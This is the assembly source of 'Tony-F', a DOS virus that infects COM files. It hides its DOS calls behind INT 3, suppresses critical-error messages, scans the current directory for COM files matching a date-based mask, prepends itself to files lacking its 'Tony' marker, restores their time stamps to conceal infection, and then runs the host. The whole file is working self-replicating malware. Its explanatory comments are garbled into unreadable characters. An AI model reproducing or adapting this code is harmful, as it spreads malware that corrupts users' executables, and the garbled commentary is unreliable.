;------------------------------------------------------------------------------;
;                                                                              ;
;                               ����� Tony-F                                   ;
;                                                                              ;
;  Tony_F � ��������� �����,���������� �� �� ������ � �������� - ��� ����������;
; �� ������� ���� ������� ��������� ������ ������ ���������� � �������� ������ ;
; ������� ���������� �� ?*.COM, ���� ? ������ �� ������.                       ;
;  Tony-F �� ��������� ����� ���� �� ��������� ����, ������� ����������        ;
; ��������� ��������� �� ��������� �� �������� ������ (������ 24h) � �� �������;
; ������ � ���� �� ���������� �������.                                         ;
;  Tony-F ������ ����������� ����� �� ������ 21h � �� ������� � ��������� ��    ;
; ������������� ���� ������ 3, ���� �������� ����� �� ���������� ��������� ��  ;
; ������ � �������.                                                            ;
;------------------------------------------------------------------------------;

; ������������ � Turbo Assembler 2.0+

        .model Tiny
        .code


VirLen  =       offset EndCode - offset Start           ; ������� �� ������.

;-----------------------------------------------------------------------------;

        Org     07Fh

INT24   db      ?                       ; ��� �� ���� ������� ������ 24h.


        Org     0100h

NewDTA  db      15h dup (?)             ; ��������� �� DTA.
FAttr   db      ?
FTime   dw      ?
FDate   dw      ?
FLen    dw      ?, ?
FName   db      0Dh dup (?)

;-----------------------------------------------------------------------------;

        Org     100h

Start:
        push    ax                      ; ������� ������������ �� AX.

;...... ��� ������� ��������� �� ����������� ������ 21h � �������� �� ���

        mov     ax,1203h
        int     2Fh                     ; ������� �� �������� �� ���.

        xor     si,si                   ; ����������� ������ �� ����� �� �������
Again:                                  ; ��� ����� - 2�h,3�h � 26h.
        lodsw
        cmp     ax,3A2Eh
        je      NextByte
        dec     si
        jnz     Again
        jmp     Done
NextByte:
        lodsb
        cmp     al,26h
        jne     Again
Found:
        sub     si,03

        mov     dx,si
        mov     ax,2503H                ; ������ 21h �� ������� �� ������� ��
        Int     21h                     ; ������ 3.

        push    cs                      ; ������������ �� ���������� �� DS.
        pop     ds

;...... ������������ �� ������� �� �������� ������

        mov     INT24,0CFh              ; ������� ��� ������ 24h - Iret
        mov     ax,2524h
        mov     dx,offset INT24
        Int 3                           ; ���������� ������� 24h.


        mov     ax,cs
        add     ah,10h
        mov     es,ax                   ; ES = CS + 64 KBytes
        mov     si,offset Start
        xor     di,di
        mov     cx,si                   ; ��������� ���� �� ������ 64KBytes
        rep     movsb                   ; ��-������ � �������.

        mov     dx,offset NewDTA        ; ������� DTA �� ��� �����.
        mov     ah,1Ah
        Int 3

        mov     ah,2Ah
        Int 3                         ; ���� �� ��� ������,
        add     dl,'A'                  ; � �� ��� �� �������� ������� �����
        mov     AllCom ,dl              ; �� ��������� �� ����������.

;...... ������� ������� �� ������� �� ����������.

        mov     dx, offset AllCom       ; ����� ������ '?*.COM' �������.
        mov     cl,110B
        mov     ah,4Eh                  ; ������� Find First.
        Int 3
        jc      Done                    ; ���������� ������� ��� ����� ��
                                        ; ������� �� ����������.
FindNext:
        mov     dx,offset Fname         ; � dx ������ �� ����� �� ����� �� DTA.
        mov     ax,3D02h                ; ������ ����� �� �����/������.
        Int 3

        mov     bx,ax                   ; ������� ������ �� ��������� ����.
        push    ds                      ; ������� DS.
        push    es
        pop     ds                      ; DS = CS + 64 KBytes.

        mov     dx,VirLen               ; DX = ��������� �� ������ .
        mov     cx,-1                   ; ������� �� ����� ���� �� ����� - DS:DX .
        mov     ah,3Fh                  ; ��� �� ������ ������,� ���� ���� ����
        Int 3                           ; � ������.

                                        ; ��������� ��������� �� �����(AX) �
        add     ax,Virlen               ; ��������� �� ������.
        jc      Close                   ; ��� ���������� ������ �� �� ��������.

        cmp     Byte ptr ds:[ Mark + VirLen -100h ],'T'         ; ���� ������ � ������� ���� ?
        je      Close

        push    ax                      ; ������� ��������� �� ����� � �����.

        xor     cx,cx
        xor     dx,dx
        mov     ax,4200h                ; ��������� �� ��������� �� �����(CX:DX)
        Int 3                           ; � �������� ��.

        pop     cx                      ; ������� ��������� �� ����� �� �����.
                                        ; DX � ����� �� 0 �� Fn 42.
        mov     ah,40h                  ; �� ������ DS:DX �� ������� �� �����
        Int 3                           ; ����� + ����.

        mov     cx,cs:FTime
        mov     dx,cs:FDate             ; ������������� �� ������ � ������� ��
        mov     ax,5701h                ; ����������� ���� �� DTA.
        Int 3

Close:
        pop     ds                      ; ������������ DS.

        mov     ah,3Eh                  ; ������� �����.
        Int 3

        mov     ah,4Fh
        Int 3                           ; ������� Find Next,
        jnc     FindNext                ; ��� ��� ��� ������� ������ �� �������
                                        ; � �� ���.


;....... ������ �� ���������� �� ���������� ��� ����� � ������� ������.

Done:
        mov     dx,80h
        mov     ah,1Ah
        Int 3                           ; ������������ �� ������ ����� �� DTA.


        push    es
        mov     ax,offset TransF -100h  ; ������� ������������ �� ������
        push    ax                      ; ����� � 64 KBytes ��-������
        RETF                            ; �� ������ TransF.

;........................................
                                        ; ���������� �� ������������ �� ��������
Mark    db      'Tony'                  ; �������.
AllCom  db      '+'                     ;
        db      '*.COM',0               ; ����� �� ������� �� ������ �������
;.......................................; �� ����������.

TRansF:
        push    ds
        pop     es

        pop     ax                      ; ������������ ������������ �� AX.

        mov     si,offset EndCode       ; ������ ���� �� ���������� ��������
        mov     di,offset Start         ; �������������� ���� ������ � 100h ����� ������.
        push    ds                      ; �������� ������ � ����� �� �������
        push    di                      ; ��� �������� �� ������������ ��������.
        mov     cx,0FFF0h -102h -Virlen
        rep     movsb

        RETF

;-----------------------------------------------------------------------------;

EndCode:
        Ret                             ; �� ��� ������� ���������� ��������

;-----------------------------------------------------------------------------;

End     Start
